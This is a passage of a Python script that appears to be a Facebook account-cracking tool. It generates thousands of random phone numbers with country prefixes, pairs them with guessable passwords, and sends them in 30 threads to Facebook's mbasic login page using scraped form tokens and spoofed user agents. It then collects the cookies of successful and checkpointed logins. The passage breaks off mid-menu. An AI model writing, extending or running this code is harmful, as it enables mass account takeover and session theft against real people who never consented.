def rmenu():
    os.system('clear')
    print(logo)
    print('   [1] Pakistan')
    print('   [2] Indian')
    print('   [3] Bangladesh')
    print('   [4] USA')
    print(50*'-')
    sharabi = raw_input('   Select country: ')
    if sharabi =='1':
        pak()
    elif sharabi =='2':
        india()
    elif sharabi =='3':
        bangla()
    elif sharabi =='4':
        usa()
    else:
        print('   \Select valid option ')
        time.sleep(1)
        rmenu()
def gen_pak(nmbrs):
    __result__=[]
    __result__.append(nmbrs)
    return __result__
def gen_ind(nmbrs,kode):
    __result__=[]
    gh = nmbrs[0:3]
    __result__.append(gh)
    return __result__
def gen_bangla(nmbrs):
    __result__=[]
    __result__.append(nmbrs)
    return __result__
def gen_usa(first,nmbrs):
    __result__=[]
    __result__.append(nmbrs)
    __result__.append(first+'#$')
    __result__.append(first+'@@')
    __result__.append(first+'123')
    __result__.append(first+'12345')
    __result__.append('123456')
    return __result__
def ran_crack(em, pas):
    global user_agent
    try:
        rua =random.choice(user_agent)
        __data__ = {}
        session = requests.Session()
        header = {
        'authority':'mbasic.facebook.com',
        'method': 'GET',
        'path': '/login.php',
        'scheme': 'https',
        'accept': 'text/html,application/xhtml+xml,application/xml,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': rua
        }
        session.headers.update(header)
        mbasic_get = session.get('https://mbasic.facebook.com/login.php')
        kuki1 = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        sb = kuki1.split(';')[0]
        datr=kuki1.split(';')[1]
        mbasic_parse = parser(mbasic_get.text,'html.parser')
        mbasic_lists = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
        for __value__ in mbasic_parse('input'):
            try:
                if __value__.get('name') in mbasic_lists:
                    __data__.update({
                        __value__.get('name'):__value__.get('value')
                    })
                else:
                    pass
            except:
                continue
        session.headers.update({'Cookie':datr+';'+sb})
        __data__.update({
            "email": em,
            "pass": pas,
            "prefill_contact_point": "",
            "prefill_source": "",
            "prefill_type": "",
            "first_prefill_source": "",
            "first_prefill_type": "",
            "had_cp_prefilled": "false",
            "had_password_prefilled": "false",
            "is_smart_lock": "false",
            "_fb_noscript": "true"
        })
        check = session.post('https://mbasic.facebook.com/login.php', data=__data__)
        get_cookie=session.cookies.get_dict().keys()
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(get_cookie)
        if 'c_user' in (get_cookie):
            cid = kuki[18:33]
            return({'status':'ok', 'email':cid, 'pass':pas, 'cookie':kuki})
        elif 'checkpoint' in (get_cookie):
            cid = kuki[24:39]
            return({'status':'cp', 'email':cid, 'pass':pas, 'cookie':kuki})
        else:
            return({'status':'error', 'email':em, 'pass':pas})
    except:
        pass
def pak():
    os.system('clear')
    print(logo)
    print('   Code example: 300, 301, 302, 303, 304, 305 ....')
    code = raw_input('   Put code like example: ')
    #lmit = int(raw_input('   Put limit of numbers: '))
    print(50*'-')
    print('   [1] Crack with auto password')
    print('   [2] Crack with choice password')
    print(50*'-')
    pass_list = raw_input('   Select option: ')
    if pass_list =='1':
        xids = []
        for x in range(5000):
            nmbr = ''.join(random.choice(string.digits) for _ in range(7))
            xids.append(nmbr)
        ids=[]
        for uid in xids:
            ids.append({'id':'92'+code+uid,'pw':gen_pak(uid)})
        os.system('clear')
        print(logo)
        ThreadPool(30).map(firefox, ids)
    elif pass_list =='2':
        xids = []
        for x in range(5000):
            nmbr = ''.join(random.choice(string.digits) for _ in range(7))
            xids.append(nmbr)
        ids=[]
        for uid in xids:
            ids.append({'id':'92'+code+uid})
        print(50*'-')
        print('   Example: 223344, 334455, 445566, 78
